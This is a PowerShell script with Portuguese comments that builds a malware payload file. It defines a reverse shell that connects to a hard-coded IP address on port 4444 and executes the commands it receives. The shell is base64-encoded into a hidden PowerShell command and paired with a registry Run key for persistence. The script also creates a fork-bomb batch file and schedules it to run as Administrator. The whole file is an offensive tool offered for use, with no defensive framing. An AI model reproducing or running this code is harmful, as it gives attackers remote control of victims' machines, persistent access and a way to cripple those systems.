###############################################################
#                                                             #
#                      SHELL - REVERSO                        #
#                                                             #
###############################################################

# Define Payload de Shell-Reverso
$x = @'
$ip = '179.106.231.153';
$port = 4444;
$TCPClient = New-Object Net.Sockets.TCPClient($ip, $port);
$NetworkStream = $TCPClient.GetStream();
$StreamWriter = New-Object IO.StreamWriter($NetworkStream);
function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}
WriteToStream '';
while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);
$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()
'@

# Encode do payload de shell-Reverso em Base64
$ShellReverseEncoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($x))

# Monta o arquivo payload linha a linha
Write-Output '# Shell Reverso' > .\payload.txt
Write-Output "powershell -W hidden -e $ShellReverseEncoded" >> .\payload.txt
Write-Output 'reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v persist /d "C:\Windows\payload.bat"' >> .\payload.txt

###############################################################
#                                                             #
#                      FORK - BOMB                            #
#                                                             #
###############################################################

# Define Payload de Fork-Bomb
$payloadBomb = '%0|%0';

# Cria o arquivo Fork-Bomb
$payloadBomb | Out-File .\bomb.bat

Write-Output '# Bomb' >> .\payload.txt
# define o que vai ser rodado e seus parâmetros

Write-Output '$actions = (New-ScheduledTaskAction -Execute "bomb.bat" -Argument Hidden)'  >> .\payload.txt
# define o gatilho que desencadeará a ação
Write-Output '$trigger = New-ScheduledTaskTrigger -Daily -At "12:00 PM" -DaysInterval 2'  >> .\payload.txt
# define o usuário e nível de privilégio
Write-Output '$principal = New-ScheduledTaskPrincipal -UserId "Administrator" -RunLevel Highest'  >> .\payload.txt
# cria a tarefa a partir dos dados anteriores 
Write-Output '$task = New-ScheduledTask -Action $actions -Principal $principal -Trigger $trigger'  >> .\payload.txt
# registra a tarefa no agendador de tarefas
Write-Output 'Register-ScheduledTask "bomb" -InputObject $task'  >> .\payload.txt
